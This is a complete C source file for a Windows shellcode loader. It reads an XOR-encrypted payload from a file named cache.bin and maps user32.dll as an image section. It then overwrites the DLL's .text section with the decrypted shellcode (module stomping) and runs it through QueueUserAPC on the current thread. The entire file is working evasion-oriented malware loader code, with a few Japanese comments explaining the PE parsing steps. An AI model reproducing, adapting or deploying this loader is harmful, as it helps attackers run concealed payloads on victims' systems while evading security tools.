#include <Windows.h>
#include <stdio.h>

#include "common.h"

#ifdef _DEBUG
#define DBG(fmt, ...) printf(fmt, __VA_ARGS__)
#else
#define DBG(fmt, ...) ((void)0)
#endif

#define SACRIFICIAL_DLL L"user32.dll"

#define MAX_SHELLCODE_SIZE (1024 * 1024 * 100)
#define KEY 0x55

PBYTE LoadShellcode(IN LPCWSTR lpPath, OUT PDWORD lpdwSize) {

	HANDLE        hFile      = INVALID_HANDLE_VALUE;
	PBYTE         pbBuffer   = NULL;
	DWORD         dwSize     = 0;
	DWORD         dwByteRead = 0;
	LARGE_INTEGER liFileSize = { 0 };

	hFile = CreateFileW(lpPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile == INVALID_HANDLE_VALUE) {
		DBG("[-] CreateFileW failed: %lu\n", GetLastError());
		goto _EndOfFunc;
	}

	if (!GetFileSizeEx(hFile, &liFileSize))	{
		DBG("[-] GetFileSizeEx failed: %lu\n", GetLastError());
		goto _EndOfFunc;
	}

	if (liFileSize.QuadPart == 0 || liFileSize.QuadPart > MAX_SHELLCODE_SIZE) {
		DBG("[-] Invalid shellcode size: %lld\n", liFileSize.QuadPart);
		goto _EndOfFunc;
	}

	dwSize = (DWORD)liFileSize.QuadPart;

	pbBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwSize);
	if (pbBuffer == NULL) {
		DBG("[-] HeapAlloc failed\n");
		goto _EndOfFunc;
	}

	if (!ReadFile(hFile, pbBuffer, dwSize, &dwByteRead, NULL) || dwByteRead != dwSize) {
		DBG("[-] ReadFile failed: %lu (read=%lu, expected=%lu)\n", GetLastError(), dwByteRead, dwSize);
		HeapFree(GetProcessHeap(), 0, pbBuffer);
		pbBuffer = NULL;
	}

	*lpdwSize = dwSize;


_EndOfFunc:
	if (hFile != INVALID_HANDLE_VALUE) {
		CloseHandle(hFile);
	}


	return pbBuffer;
}

NTSTATUS LoadDllFile(IN LPCWSTR lpDllName, OUT PVOID* ppModuleBase, OUT PSIZE_T pMapSize) {

	WCHAR                lpDllPath[MAX_PATH] = { 0 };
	WCHAR                lpSysDir[MAX_PATH]  = { 0 };

	HMODULE              hNtdll              = NULL;
	fnNtMapViewOfSection NtMapViewOfSection  = NULL;
	fnNtCreateSection    NtCreateSection     = NULL;

	HANDLE               hFile               = INVALID_HANDLE_VALUE;
	HANDLE               hSection            = NULL;

	PVOID                pBase               = NULL;
	SIZE_T               sViewSize           = 0;

	NTSTATUS             status              = STATUS_UNSUCCESSFUL;

	hNtdll = GetModuleHandleW(L"ntdll.dll");
	if (hNtdll == NULL) {
		status = STATUS_DLL_NOT_FOUND;
		goto _EndOfFunc;
	}

	NtCreateSection = (fnNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
	if (!NtCreateSection) {
		status = STATUS_PROCEDURE_NOT_FOUND;
		goto _EndOfFunc;
	}

	NtMapViewOfSection = (fnNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
	if (!NtMapViewOfSection) {
		status = STATUS_PROCEDURE_NOT_FOUND;
		goto _EndOfFunc;
	}

	GetSystemDirectoryW(lpSysDir, MAX_PATH);
	swprintf_s(lpDllPath, MAX_PATH, L"%s\\%s", lpSysDir, lpDllName);

	hFile = CreateFileW(lpDllPath, GENERIC_READ | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		DBG("CreateFileW failed error: %lu\n", GetLastError());
		status = STATUS_UNSUCCESSFUL;
		goto _EndOfFunc;
	}

	status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0x00, PAGE_READONLY, SEC_IMAGE, hFile);
	if (!NT_SUCCESS(status)) {
		DBG("NtCreateSection failed error: %lu\n", GetLastError());
		goto _EndOfFunc;
	}

	status = NtMapViewOfSection(hSection, GetCurrentProcess(), &pBase, 0, 0, NULL, &sViewSize, ViewUnmap, 0, PAGE_READWRITE);
	if (!NT_SUCCESS(status)) {
		DBG("NtMapViewOfSection failed error: %lu\n", GetLastError());
		goto _EndOfFunc;
	}

	*ppModuleBase = pBase;
	*pMapSize = sViewSize;

	status = STATUS_SUCCESS;

_EndOfFunc:
	if (hSection != NULL) {
		CloseHandle(hSection);
	}
	if (hFile != INVALID_HANDLE_VALUE) {
		CloseHandle(hFile);
	}
	return status;
}

BOOL ResolveSection(IN PVOID pPE, IN LPCSTR lpSectionName, OUT PVOID* ppSection, OUT PSIZE_T psSize) {

	PIMAGE_DOS_HEADER     pImgDosHdr        = NULL;
	PIMAGE_NT_HEADERS     pImgNtHdr         = NULL;
	PIMAGE_SECTION_HEADER pImgSectionHdr    = NULL;

	WORD                  wNumberOfSections = 0;
	WORD                  wIndex            = 0;

	BOOL                  bSuccess          = FALSE;

	if (!pPE || !lpSectionName || !ppSection || !psSize) {
		goto _EndOfFunc;
	}

	// 2. pPE を PIMAGE_DOS_HEADER にキャストして DOS ヘッダとして扱う
	pImgDosHdr = (PIMAGE_DOS_HEADER)pPE;

	// 3. (オプション) DOS シグネチャ "MZ" を検証
	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
		goto _EndOfFunc;
	}

	// 4. e_lfanew を読んで NT ヘッダの位置を計算
	pImgNtHdr = (PIMAGE_NT_HEADERS)((PBYTE)pImgDosHdr + pImgDosHdr->e_lfanew);

	// 5. (オプション) NT シグネチャ "PE\0\0" を検証
	if (pImgNtHdr->Signature != IMAGE_NT_SIGNATURE) {
		goto _EndOfFunc;
	}

	// 6. NumberOfSections からセクション数を取得
	wNumberOfSections = pImgNtHdr->FileHeader.NumberOfSections;

	// 7. IMAGE_FIRST_SECTION  を使ってセクションヘッダ配列の先頭を取得
	pImgSectionHdr = IMAGE_FIRST_SECTION(pImgNtHdr);

	// 8. ループでセクションを巡回し、名前が ".text" のものを探す
	for (wIndex = 0; wIndex < wNumberOfSections; wIndex++) {
		// 9. 見つかったら出力引数に書き込んで TRUE を返す
		if (!strncmp((char*)pImgSectionHdr[wIndex].Name, lpSectionName, IMAGE_SIZEOF_SHORT_NAME)) {
			*ppSection = (PBYTE)pPE + pImgSectionHdr[wIndex].VirtualAddress;
			*psSize = pImgSectionHdr[wIndex].Misc.VirtualSize;
			bSuccess = TRUE;
			break;
		}
	}

_EndOfFunc:
	return bSuccess;
}

BOOL StompSectionWithDecrypt(IN PVOID pStompAddr, IN SIZE_T sStompSize, IN PVOID pPayload, IN SIZE_T sPayloadSize, IN BYTE bKey) {

	PBYTE pStomp       = NULL;

	DWORD dwOldProtect = 0;
	DWORD dwTemp       = 0;

	BOOL  bSuccess     = FALSE;

	if (!pStompAddr || !sStompSize || !pPayload || !sPayloadSize) {
		goto _EndOfFunc;
	}

	if (sStompSize < sPayloadSize) {
		DBG("[-] Section too small: %llu bytes available, %llu needed\n", sStompSize, sPayloadSize);
		goto _EndOfFunc;
	}

	if (!VirtualProtect(pStompAddr, sPayloadSize, PAGE_READWRITE, &dwOldProtect)) {
		DBG("[-] VirtualProtect (RW) failed: %lu\n", GetLastError());
		goto _EndOfFunc;
	}

	RtlCopyMemory(pStompAddr, pPayload, sPayloadSize);

	pStomp = (PBYTE)pStompAddr;

	for (SIZE_T i = 0; i < sPayloadSize; i++) {
		pStomp[i] ^= bKey;
	}
	
	if (!VirtualProtect(pStompAddr, sPayloadSize, dwOldProtect, &dwTemp)) {
		DBG("[-] VirtualProtect (RX) failed: %lu\n", GetLastError());
		goto _EndOfFunc;
	}

	bSuccess = TRUE;

_EndOfFunc:
	return bSuccess;
}

BOOL RunViaModuleStomping(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

	PVOID    pDllBase      = NULL;
	SIZE_T   sDllSize      = 0;
		     
	PVOID    pStompAddr    = NULL;
	SIZE_T   sStompSize    = 0;

	NTSTATUS status        = STATUS_UNSUCCESSFUL;
	BOOL     bSuccess      = FALSE;

	status = LoadDllFile(SACRIFICIAL_DLL, &pDllBase, &sDllSize);

	if (!NT_SUCCESS(status)) {
		DBG("[-] LoadDllFile failed error: %lu\n", status);
		goto _EndOfFunc;
	}

	if (!ResolveSection(pDllBase, ".text", &pStompAddr, &sStompSize)) {
		DBG("[-] ResolveSection failed error: %lu\n", GetLastError());
		goto _EndOfFunc;
	}

	if (!StompSectionWithDecrypt(pStompAddr, sStompSize, pPayload, sPayloadSize, KEY)) {
		DBG("[-] StompSectionWithDecrypt failed error: %lu\n", GetLastError());
		goto _EndOfFunc;
	}
	

	if (!QueueUserAPC((PAPCFUNC)pStompAddr, hThread, (ULONG_PTR)NULL)) {
		DBG("[-] QueueUserAPC failed :%lu\n", GetLastError());
		goto _EndOfFunc;
	}

	bSuccess = TRUE;

_EndOfFunc:
	if (!bSuccess && pDllBase != NULL) {
		UnmapViewOfFile(pDllBase);
	}
	return bSuccess;
}

int main(void) {

	PBYTE  pbShellcode     = NULL;
	DWORD  dwShellcodeSize = 0;

	HANDLE hThread         = NULL;
	HANDLE hEvent          = NULL;

	int    nExitCode       = EXIT_FAILURE;
	
	
	pbShellcode = LoadShellcode(L"cache.bin", &dwShellcodeSize);
	if (pbShellcode == NULL) {
		goto _EndOfFunc;
	}

	hThread = GetCurrentThread();

	if (!RunViaModuleStomping(hThread, pbShellcode, dwShellcodeSize)) {
		DBG("RunViaModuleStomping failed");
		goto _EndOfFunc;
	}

	hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	if (hEvent) {
		WaitForMultipleObjectsEx(1, &hEvent, TRUE, INFINITE, TRUE);
		CloseHandle(hEvent);
	}
	
	nExitCode = EXIT_SUCCESS;

_EndOfFunc:
	if (pbShellcode != NULL) {
		RtlSecureZeroMemory(pbShellcode, dwShellcodeSize);
		HeapFree(GetProcessHeap(), 0, pbShellcode);
	}
	return EXIT_SUCCESS;
}